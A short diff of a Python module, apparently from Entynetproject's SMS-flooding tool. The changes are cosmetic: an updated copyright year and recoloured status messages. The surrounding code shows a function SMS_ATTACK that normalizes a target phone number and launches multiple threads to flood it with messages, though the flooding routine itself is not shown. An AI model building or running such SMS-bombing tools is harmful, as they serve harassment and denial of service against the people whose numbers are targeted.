@@ -2,7 +2,7 @@
 
 # MIT License
 #
-# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
+# Copyright (C) 2020, Entynetproject. All Rights Reserved.
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -41,7 +41,7 @@ def SMS_ATTACK(threads, attack_time, phone):
 	phone = number.normalize(phone)
 	# Get country name by phone
 	country = number.getCountry(phone)
-	print("[BEGIN] Starting SMS flood to number: " + phone + ", country: " + country + ", time: " + str(attack_time) + " seconds...")
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting SMS attack...")
 
 	# Send SMS
 	def sms_flood():
@@ -53,7 +53,7 @@ def SMS_ATTACK(threads, attack_time, phone):
 
 	# Start threads
 	for thread in range(threads):
-		print("[BEGIN] Starting thread " + str(thread) + "...")
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Starting thread " + str(thread) + "...")
 		t = Thread(target = sms_flood)
 		t.start()
 		threads_list.append(t)
@@ -67,4 +67,4 @@ def SMS_ATTACK(threads, attack_time, phone):
 		FINISH = True
 		thread.join()
 	
-	print("[WARNING] Attack stopped!")
+	print("\033[1;33m"+"[!]"+"\033[0m"+" SMS attack completed.")
